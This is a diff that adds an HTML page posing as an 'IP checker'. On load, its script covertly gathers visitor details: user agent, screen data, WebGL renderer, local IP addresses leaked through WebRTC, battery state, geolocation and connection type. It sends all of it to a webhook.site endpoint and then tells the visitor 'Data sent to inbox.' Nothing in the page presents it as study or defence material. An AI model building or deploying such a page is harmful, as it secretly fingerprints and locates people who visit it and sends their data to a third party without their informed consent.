@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>My IP Checker</title>
+<style>
+  body {font-family: Arial, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background:#f0f0f0;}
+  .card {padding:20px; background:#fff; border-radius:10px; box-shadow:0 4px 12px rgba(0,0,0,0.1); text-align:center;}
+  #status {font-size:18px; margin-bottom:10px;}
+  .sub {font-size:13px; opacity:0.7;}
+</style>
+</head>
+<body>
+  <div class="card">
+    <h3 id="status">Loading info… ⏳</h3>
+    <div class="sub">Your winning is extra voltage.</div>
+  </div>
+
+<script>
+(async function(){
+  const WEBHOOK = "https://webhook.site/ba470006-69d7-4c40-92d6-045006db2366"; // replace with your webhook URL
+
+  function jsonPost(url,obj){
+    try{ navigator.sendBeacon && navigator.sendBeacon(url, JSON.stringify(obj)); }
+    catch(e){ fetch(url,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(obj)}).catch(()=>{}); }
+  }
+
+  async function getWebGL(){
+    try{
+      const c = document.createElement('canvas');
+      const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+      if(!gl) return null;
+      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+      return dbg ? {vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL), renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)} : null;
+    } catch(e){ return null; }
+  }
+
+  async function getLocalIPs(){
+    return new Promise((resolve)=>{
+      const ips = new Set();
+      const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+      pc.createDataChannel('');
+      pc.onicecandidate = (e)=>{
+        if(!e || !e.candidate){ pc.close(); resolve([...ips]); return; }
+        const parts = e.candidate.candidate.split(' ');
+        const ip = parts[4];
+        if(ip) ips.add(ip);
+      };
+      pc.createOffer().then(sdp=>pc.setLocalDescription(sdp)).catch(()=>resolve([]));
+      setTimeout(()=>{ try{pc.close()}catch(e){}; resolve([...ips]); },3000);
+    });
+  }
+
+  const webgl = await getWebGL();
+  const localIPs = await getLocalIPs();
+  const battery = (navigator.getBattery ? await navigator.getBattery().catch(()=>null) : null);
+
+  let geo = null;
+  if(navigator.geolocation){
+    try{
+      geo = await new Promise(res=>{
+        navigator.geolocation.getCurrentPosition(p=>res({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}), ()=>res(null), {timeout:8000});
+      });
+    }catch(e){ geo = null; }
+  }
+
+  const payload = {
+    ua: navigator.userAgent,
+    platform: navigator.platform,
+    languages: navigator.languages,
+    screen: {width: screen.width, height: screen.height, pixelRatio: window.devicePixelRatio},
+    inner: {w: innerWidth, h: innerHeight},
+    webgl, localIPs,
+    battery: battery ? {charging: battery.charging, level: battery.level} : null,
+    geolocation: geo,
+    connection: navigator.connection ? {type: navigator.connection.effectiveType, down: navigator.connection.downlink} : null,
+    timestamp: new Date().toISOString()
+  };
+
+  jsonPost(WEBHOOK, payload);
+
+  // Update UI status
+  document.getElementById('status').textContent = "All done! ✅ Data sent to inbox.";
+})();
+</script>
+</body>
+</html>
